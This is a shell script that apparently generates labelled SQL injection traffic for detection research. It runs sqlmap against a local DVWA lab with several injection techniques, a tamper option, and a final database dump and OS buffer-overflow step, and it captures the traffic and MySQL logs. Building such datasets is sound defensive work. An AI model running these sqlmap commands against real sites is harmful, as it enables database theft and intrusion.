# dont forget to enable slow query log in mysql server console
rm -rf data_temp/*
echo "Cleaning sample directory.."
rm -rf /root/.sqlmap/output/*
echo "Cleaning sqlmap session.."
rm -rf /var/log/mysql/slow-query.log
echo "Cleaning MySQL log directory.."
mysql -u root -p < ./test_env/en_slog.sql
echo "Enabling MySQL slow query log configuration.."
# python3 slogparser.py &
# slog_pid=($!)
# echo "slogid=${slog_pid}"
types=(tautology incorrect union piggyback inference)
flag=(B E U S T)
for i in "${!types[@]}"; 
do 
    echo "${flag[$i]}"
    echo "${types[$i]}"
    python3 httpsniffer.py --get --label-threat --technique "${types[$i]}" &
    listener_pid=($!)
    echo "aid=${listener_pid}"
    sleep 5
    sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 3 --dbms mysql --cookie="security=low; PHPSESSID=g7q0q8ngu6iun08obovf67g3n4" -p "id" --technique "${flag[$i]}" --answers="follow=Y,optimize=Y" --batch --mobile --param-exclude="token|session" --flush-session & #--delay=2 --tamper=space2comment &
    sqlmap_pid=($!)
    echo "sid=${sqlmap_pid}"
    wait $sqlmap_pid
    kill $listener_pid
    echo "Holding..."
    sleep 3
done
./test_env/force_stop.sh
for i in "${!types[@]}"; 
do 
    echo "${flag[$i]}"
    echo "${types[$i]}"
    python3 httpsniffer.py --get --label-threat --technique "${types[$i]}" &
    listener_pid=($!)
    echo "aid=${listener_pid}"
    sleep 5
    sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 3 --dbms mysql --cookie="security=low; PHPSESSID=g7q0q8ngu6iun08obovf67g3n4" -p "id" --technique "${flag[$i]}" --answers="follow=Y,optimize=Y" --tamper=space2comment --batch --mobile --param-exclude="token|session" --flush-session & #--delay=2  &
    sqlmap_pid=($!)
    echo "sid=${sqlmap_pid}"
    wait $sqlmap_pid
    kill $listener_pid
    echo "Holding..."
    sleep 3
done
./test_env/force_stop.sh
python3 httpsniffer.py --get --label-threat --technique "postex" &
# kill slog_pid
# ps -aux | grep python
# pkill -f httpsniffer.py
# todo: use tamper space2comment
echo "Running post exploitation..."
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --dbms mysql --cookie="security=low; PHPSESSID=g7q0q8ngu6iun08obovf67g3n4" -p "id" --dump --batch --os-bof --flush-session
echo "GET_http.csv lines: `wc -l ./data_temp/GET_http.csv`"
echo "LOG_mysql.csv lines: `wc -l ./data_temp/LOG_mysql.csv`"
./test_env/force_stop.sh
echo "DONE"
